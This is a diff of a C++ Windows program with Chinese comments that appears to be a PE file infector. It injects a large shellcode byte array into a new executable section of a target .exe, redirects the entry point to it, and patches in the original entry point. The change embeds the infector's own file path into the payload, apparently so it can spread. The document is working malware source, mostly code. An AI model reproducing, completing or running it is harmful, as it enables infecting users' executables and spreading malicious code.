@@ -1,6 +1,7 @@
 #include <Windows.h>
 wchar_t path[MAX_PATH] = L"test.exe";
-unsigned char shellcode[] = { 0xe8,0x0,0x0,0x0,0x0,0x58,0x55,0x89,0xe5,0x89,0xc3,0x5,0x80,0x7,0x0,0x0,
+
+unsigned char buf[] = { 0xe8,0x0,0x0,0x0,0x0,0x58,0x55,0x89,0xe5,0x89,0xc3,0x5,0x80,0x7,0x0,0x0,
 0x81,0xc3,0x80,0x1d,0x1,0x0,0x68,0x0,0x0,0x0,0x0,0x68,0x5,0x0,0x0,0x0,
 0x53,0x68,0x40,0x69,0x1c,0xf3,0x50,0xe8,0x2,0x0,0x0,0x0,0xc9,0xc3,0x83,0xec,
 0x6c,0x53,0x55,0x56,0x57,0xb9,0x4c,0x77,0x26,0x7,0xe8,0x6e,0x6,0x0,0x0,0x8b,
@@ -4568,7 +4569,7 @@ unsigned char shellcode[] = { 0xe8,0x0,0x0,0x0,0x0,0x58,0x55,0x89,0xe5,0x89,0xc3
 0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
 0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
 0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
-0x0,0x0,0x0,0x0,0x0,0x32,0x2e,0x74,0x78,0x74 };
+0x0,0x0,0x0,0x0,0x0 };
 
 
 //对齐粒度
@@ -4579,9 +4580,17 @@ DWORD Aligment(DWORD dwSize, DWORD dwAlig)
 
 void main()
 {
+	MessageBoxA(NULL, "SUCCESS", "成功", MB_OK);
+	char currentpath[MAX_PATH] = { 0 };
+	GetModuleFileNameA(NULL, currentpath, MAX_PATH);
+	int totalSize = strlen(currentpath) + sizeof(buf);
+	char *shellcode = new char[totalSize];
+	memcpy(shellcode, buf, sizeof(buf));
+	memcpy(shellcode + 0x11d85, currentpath, strlen(currentpath));
 	HANDLE hFile = CreateFile(path, FILE_GENERIC_READ | FILE_GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (INVALID_HANDLE_VALUE == hFile)
 	{
+		delete[] shellcode;
 		return;
 	}
 	HANDLE hFileMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
@@ -4612,8 +4621,8 @@ void main()
 	DWORD dwFileAlig = pOptionalHeader->FileAlignment;
 	DWORD dwMemAlig = pOptionalHeader->SectionAlignment;
 	memcpy(pLastSectionHeader->Name, ".data", 7);
-	pLastSectionHeader->Misc.VirtualSize = sizeof(shellcode);
-	pLastSectionHeader->SizeOfRawData = Aligment(sizeof(shellcode), dwFileAlig);
+	pLastSectionHeader->Misc.VirtualSize = totalSize;
+	pLastSectionHeader->SizeOfRawData = Aligment(totalSize, dwFileAlig);
 	pLastSectionHeader->VirtualAddress = (pLastSectionHeader - 1)->VirtualAddress + Aligment((pLastSectionHeader - 1)->SizeOfRawData, dwMemAlig);  //虚拟偏移
 	pLastSectionHeader->PointerToRawData = Aligment((pLastSectionHeader - 1)->PointerToRawData + (pLastSectionHeader - 1)->Misc.VirtualSize, dwFileAlig); //文件偏移
 	pLastSectionHeader->Characteristics = 0xE0000060;
@@ -4623,20 +4632,20 @@ void main()
 	//修改入口点
 	DWORD oldOep = pOptionalHeader->AddressOfEntryPoint;
 	pOptionalHeader->AddressOfEntryPoint = pLastSectionHeader->VirtualAddress;
+	//填入入口点
 	*(DWORD*)&shellcode[0xBA0] = oldOep+ pOptionalHeader->ImageBase;
 	//修改文件
 	int newFileSize = pLastSectionHeader->PointerToRawData + pLastSectionHeader->SizeOfRawData;
-	char* pNewFile = new char[newFileSize];
+	char  *pNewFile = new char[newFileSize];
 	ZeroMemory(pNewFile, newFileSize);
 	memcpy(pNewFile, lpMemory, pLastSectionHeader->PointerToRawData);
-	memcpy(pNewFile + pLastSectionHeader->PointerToRawData, shellcode, sizeof(shellcode));
+	memcpy(pNewFile + pLastSectionHeader->PointerToRawData, shellcode, totalSize);
 	//写出文件
 	DWORD dwWrite = 0;
 	WriteFile(hFile, pNewFile, newFileSize, &dwWrite, NULL);
 	delete[] pNewFile;
 exit:
+	delete[] shellcode;
 	CloseHandle(hFileMap);
 	CloseHandle(hFile);
 }
-
-//分支测试
